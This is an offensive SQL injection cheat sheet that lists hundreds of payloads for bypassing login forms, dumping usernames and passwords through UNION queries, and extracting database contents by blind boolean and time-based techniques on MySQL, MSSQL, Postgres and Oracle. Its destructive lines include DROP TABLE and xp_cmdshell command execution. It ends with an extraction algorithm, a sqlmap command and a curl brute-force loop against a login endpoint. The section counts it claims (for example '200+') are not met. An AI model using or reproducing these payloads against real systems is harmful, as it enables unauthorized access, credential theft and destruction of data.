##Universal SQL Injection Authentication Bypass Masterlist:


' OR 1=1--

' OR '1'='1

' OR '1'='1'--

" OR 1=1--

" OR "1"="1


admin' --

admin'#

admin'/*

admin' OR '1'='1

admin' OR 1=1--

admin' OR 'x'='x

admin' OR 'x'='x'--

' OR ''='

' OR 'a'='a

' OR TRUE--

' OR 1=1# 

' OR 1=1/*

') OR '1'='1--

') OR ('1'='1

admin') OR ('1'='1

1' OR '1'='1--

1 OR 1=1

1' OR 1=1--

admin' OR 1=CAST(1 AS CHAR)--

' OR 1=1 UNION SELECT NULL--

admin') OR 1=1--

' OR '1'='1' UNION SELECT 1--

' UNION SELECT 1--

1' UNION SELECT 1--

admin' UNION SELECT 1--

') UNION SELECT 1--

' OR 1 GROUP BY 1--

admin' OR 1=1 AND 1=1--

' OR SLEEP(5)--

' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--

admin' AND 1=0 UNION SELECT 1--

' OR 1=1 LIMIT 1--

admin' OR '1'='1' LIMIT 1--

1' OR 1=1 LIMIT 1--

' AND 1=0 UNION ALL SELECT NULL,@@version--

admin' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--

' OR IF(1=1,SLEEP(5),0)--

admin' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--

') OR 1=1 AND ('1'='1

admin' OR EXISTS(SELECT * FROM users)--

' OR 1=1 ORDER BY 1--

admin' ORDER BY 1--

1' ORDER BY 1--

'; DROP TABLE users; --

'; SELECT * FROM users WHERE 1=1--

' UNION ALL SELECT NULL,username,password FROM users--

admin' UNION SELECT NULL,user,password FROM mysql.user--

' OR 1=1 UNION ALL SELECT NULL,table_name FROM information_schema.tables--

' OR (CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--

admin' AND 1=(CASE WHEN (1=1) THEN 1 ELSE 0 END)--

' OR 1 IN (SELECT 1)--

admin' AND 1=1 AND 1=CONCAT(0x71787a7171,(SELECT table_name FROM information_schema.tables LIMIT 1),0x71787a7171)--

' OR 1=1 AND (SELECT SUBSTRING(@@version,1,1))='5'--

admin' AND LENGTH((SELECT * FROM users LIMIT 1))=10--

'; EXEC sp_executesql N'SELECT * FROM users'--

' OR 1=1; SELECT PG_SLEEP(5); --

admin' OR 1=1; SELECT COUNT(*) FROM all_tables; --

' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('A',5)=1--

admin' AND 1=(SELECT COUNT(*) FROM all_users)--

' OR 1=1 UNION SELECT banner FROM v$version--

' OR 1=1 AND CTXSYS.DRITHSX.SN(1,USER)=1--

admin' OR 1=1 AND (SELECT COUNT(*) FROM tab)>0--

1' AND 1=0 UNION SELECT table_name,column_name FROM information_schema.columns--

' OR @@version LIKE '%5.%'--

admin' AND SUBSTRING(@@version,1,1)='5'--

' OR 1=1 AND ASCII(SUBSTRING(database(),1,1))=109--

admin' OR USER_NAME()=1--

' OR 1=1 AND SYSTEM_USER=1--

admin' AND 1=DB_ID()--

'; DECLARE @a VARCHAR(99);SET @a=CAST(DB_NAME() AS VARCHAR(99));SELECT @a--

' OR 1=1; SELECT * FROM sysobjects WHERE xtype='U'; --

admin' AND 1=1 EXEC('SELECT * FROM users')--

' UNION SELECT username,password FROM members--

' OR 1=1 UNION SELECT login,pass FROM admins--

admin' OR 1=1 UNION ALL SELECT NULL,username,password,NULL FROM users--

'; SELECT * FROM users WHERE ''1''=''1--

' OR 1=1 AND 1=CONVERT(int,(SELECT @@version))--

admin' AND 1=CAST((SELECT @@version) AS int)--

' OR 1=1 AND (SELECT COUNT(*) FROM pg_class)>0--

admin' OR EXISTS(SELECT * FROM pg_user WHERE usename='postgres')--

1' AND 1=0 UNION SELECT table_name FROM user_tables--

'; BEGIN DBMS_LOCK.SLEEP(5); END; --

' OR 1=1 AND (SELECT COUNT(*) FROM dba_users)>0--

admin' OR 1=1 UNION SELECT username,password FROM dba_users--

' OR 1=1 AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())--

admin' AND 1=CONCAT(CHAR(60),CHAR(98),CHAR(111),CHAR(100),CHAR(121),CHAR(62),'hacked')--

' OR 1=1 AND 1=CAST((CHR(113)||CHR(106)||CHR(113)||CHR(98)||CHR(113))||(SELECT (ELT(1=1,database())))||CHR(113)||CHR(106)||CHR(113)||CHR(107)||CHR(113) AS CHAR)--

'; WAITFOR DELAY '0:0:5'--

admin' AND 1=1; IF 1=1 WAITFOR DELAY '0:0:5'--

' OR 1=1 AND 1=(SELECT TOP 1 1 FROM master..sysdatabases)--

admin' OR 1=1 AND EXISTS(SELECT * FROM OPENROWSET('SQLOLEDB','trusted_connection=yes';'server=localhost';'select 1'))--

' UNION ALL SELECT NULL,NULL,database(),@@version--

admin' OR 1=1 UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables--

1' OR '1'='1' AND '1'='1' AND 1=1--

' OR '1'='1' AND '1'='1' OR 1=1--

admin'-- 

admin' OR 1=1/*


admin' OR '1'='1'/*

' OR 1=1 AND '1'='1

' OR 'a'='a'--

') OR ('1'='1

" OR ""=" 

" OR "1"="1"--

1 OR 1=1--

1' OR '1'='1--

admin OR 1=1--

admin OR 1=1/*

admin' OR ''='

' OR 1=1--

' OR 0=0--

-1 OR 1=1--

-1' OR 1=1--

-1 OR 1=1--

' OR '1'='1' OR ''

admin' UNION ALL SELECT NULL--

' OR 1=1 UNION ALL SELECT NULL--

1' UNION SELECT 1--

';SELECT * FROM users--

' UNION SELECT 1,2,3--

admin' OR 1=1 UNION SELECT 1--

' OR 1 AND 1=1--
' OR (1)-- 

' OR 1#  

' OR 1/*

NULL' UNION SELECT 1--

-1' UNION SELECT 1--

' OR 1=1 UNION SELECT 1,@@version--

admin' OR 1=1 AND SLEEP(5)--

' AND 1=0 UNION SELECT 1--

' OR 1=1; SELECT * FROM users--

admin' OR 1=1 ORDER BY 1--

1' OR 1=1 ORDER BY 1--

' OR 1=1 LIMIT 1--

' OR 1=1 AND 1=1--

admin' OR EXISTS(SELECT * FROM users WHERE 1=1)--

'; EXEC xp_cmdshell('whoami')--

' OR 1=1; EXEC('SELECT * FROM users')--

2. Targeted Administrative Bypass

   
admin' --

admin'#

admin'/*
admin' OR '1'='1'

admin' OR 1=1--

admin' OR 'x'='x'--

admin' OR '1'='1' LIMIT 1--

admin' OR 1=1 LIMIT 1--

admin' OR 1=1 AND 1=1--

admin' OR EXISTS(SELECT * FROM users)--

admin' AND 1=0 UNION SELECT 1--

admin' OR 1=CAST(1 AS CHAR)--

3.Parentheses & Syntax Obfuscation:

') OR '1'='1--

') OR ('1'='1

admin') OR ('1'='1

admin') OR 1=1--

') UNION SELECT 1--

') OR 1=1 AND ('1'='1

') UNION SELECT NULL,NULL,NULL--

4.Union-Based & Data Extraction:

' UNION SELECT 1--

1' UNION SELECT 1--

admin' UNION SELECT 1--

' OR 1=1 UNION SELECT NULL--

' OR 1=1 UNION SELECT 1--

' OR 1=1 UNION SELECT NULL,@@version--

' OR 1=1 UNION ALL SELECT NULL,table_name FROM information_schema.tables--

' OR 1=1 UNION ALL SELECT NULL,username,password FROM users--

' UNION SELECT username,password FROM members--

' OR 1=1 UNION SELECT login,pass FROM admins--

5. Blind & Time-Based Extraction (Stealth)

6. BLIND BOOLEAN & TIME-BASED PAYLOADS (200+)
1. BASIC TIME-BASED (40+)



1. ' AND SLEEP(5)--
2. ' AND SLEEP(5)/*
3. AND SLEEP(5)--
4. ' OR SLEEP(5)--
5. admin' AND SLEEP(5)--
6. ' AND (SELECT * FROM (SELECT SLEEP(5))a)--
7. ' OR IF(1=1,SLEEP(5),0)--
8. ' AND IF(1=1,SLEEP(5),0)--

9. '; WAITFOR DELAY '0:0:5'--
10. '; WAITFOR DELAY '0:0:5'/*
11. admin' AND 1=1; WAITFOR DELAY '0:0:5'--
12. ' OR 1=1; WAITFOR DELAY '0:0:5'--

13. ' OR PG_SLEEP(5)--
14. ' AND PG_SLEEP(5)--
15. admin' OR 1=1; SELECT PG_SLEEP(5);--

16. ' AND DBMS_PIPE.RECEIVE_MESSAGE('A',5)=1--
17. ' OR DBMS_LOCK.SLEEP(5)=1--
18. admin' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('A',5)--

19. ' AND (SELECT COUNT(*) FROM sleep(5))--
20. admin' AND 1=SLEEP(5)--
2. BLIND BOOLEAN BASED (40+)



21. ' AND 1=1--
22. ' AND 1=2--
23. admin' AND 1=1--
24. admin' AND 1=2--
25. ' AND '1'='1--
26. ' AND '1'='2--
27. 1' AND 1=1--
28. 1' AND 1=2--

29. ' OR 1=1--
30. ' OR 1=2--
31. admin' OR 1=1--
32. admin' OR 1=2--

33. ' AND EXISTS(SELECT * FROM users)--
34. ' AND NOT EXISTS(SELECT * FROM users WHERE 1=2)--
35. admin' AND EXISTS(SELECT * FROM information_schema.tables)--

36. ' AND LENGTH(database())=5--
37. ' AND LENGTH(user())>5--
38. admin' AND LENGTH(@@version)>10--
3. CHARACTER EXTRACTION (BOOLEAN) (40+)



39. admin' AND ASCII(SUBSTRING(database(),1,1))>109--
40. admin' AND ASCII(SUBSTRING(database(),1,1))<109--
41. admin' AND ASCII(SUBSTRING(database(),2,1))>97--
42. ' AND ASCII(SUBSTRING(user(),1,1))>114--

43. admin' AND SUBSTRING(@@version,1,1)='5'--
44. admin' AND SUBSTRING(@@version,2,1)>'5'--
45. admin' AND SUBSTRING(database(),1,1)='t'--

46. ' AND LENGTH((SELECT table_name FROM information_schema.tables LIMIT 0,1))=5--
47. admin' AND LENGTH((SELECT table_name FROM information_schema.tables LIMIT 1,1))=4--

48. admin' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1))>117--
49. admin' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),2,1))>115--
50. ' AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1)='u'--
4. ADVANCED TIME-BASED (40+)



51. admin' AND 1=(SELECT COUNT(*) FROM (SELECT SLEEP(5))x)--
52. ' AND 1=IF(1=1,SLEEP(5),0)--
53. admin' AND IF(ASCII(SUBSTRING(database(),1,1))>109,SLEEP(5),0)--
54. ' OR (CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--

55. '; IF 1=1 WAITFOR DELAY '0:0:5'--
56. admin'; IF ASCII(SUBSTRING(@@version,1,1))>53 WAITFOR DELAY '0:0:5'--

57. admin' OR 1=1 AND (SELECT 1 FROM pg_sleep(5))--
58. ' AND 1=(SELECT CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE 0 END)--

59. admin' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--
60. ' OR 1=1 AND DBMS_LOCK.SLEEP(5)=0--
5. MSSQL Time/Boolean (20+)



61. admin' AND 1=1; IF 1=1 WAITFOR DELAY '0:0:3'--
62. '; IF (1=1) WAITFOR DELAY '0:0:5'--
63. admin' AND CASE WHEN (1=1) THEN 1 ELSE 0 END=1--

64. ' AND 1=(SELECT COUNT(*) FROM master..sysdatabases WHERE 1=1)--
65. admin' AND 1=(SELECT COUNT(*) FROM sysobjects WHERE xtype='U')--
6. POSTGRES/Oracle Time (15+)



66. admin' AND 1=1 AND (SELECT COUNT(*) FROM pg_class)>0--
67. ' OR 1=1 AND (SELECT COUNT(*) FROM pg_user)>0--

68. admin' AND 1=(SELECT COUNT(*) FROM all_users)--
69. ' AND 1=1 AND (SELECT COUNT(*) FROM all_tables)>0--
7. URL-ENCODED BLIND (15+)



70. %27%20AND%20SLEEP%285%29--
71. %27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29--
72. admin%27%20AND%20ASCII%28SUBSTRING%28database%28%29%2C1%2C1%29%29%3E109--
8. OBFUSCATED BLIND (20+)



73. admin' AND 1=1/**/AND/**/SLEEP(5)--
74. ' AND/**/IF(1=1,SLEEP(5),0)--
75. admin'%0aAND%0dSLEEP(5)--
76. ' AND SLEEP(5)%00--
BLIND EXTRACTION ALGORITHM:



# Extract database name char-by-char
For position 1 to 20:
  For char_code 32 to 126:
    admin' AND ASCII(SUBSTRING(database(),$position,1))=$char_code--

# Time-based version
For position 1 to 20:
  For char_code 32 to 126:
    admin' AND IF(ASCII(SUBSTRING(database(),$position,1))=$char_code,SLEEP(3),0)--
AUTOMATION SCRIPTS:
bash



# SQLMap Blind
sqlmap -u "http://target/login" --data="user=admin&pass=§" --technique=BT --delay=2 --threads=1

# Custom Time-Based
for i in {1..20}; do
  for c in {32..126}; do
    curl -d "user=admin' AND IF(ASCII(SUBSTRING(database(),$i,1))=$c,SLEEP(3),0)--&pass=pass" http://target/login
  done
done



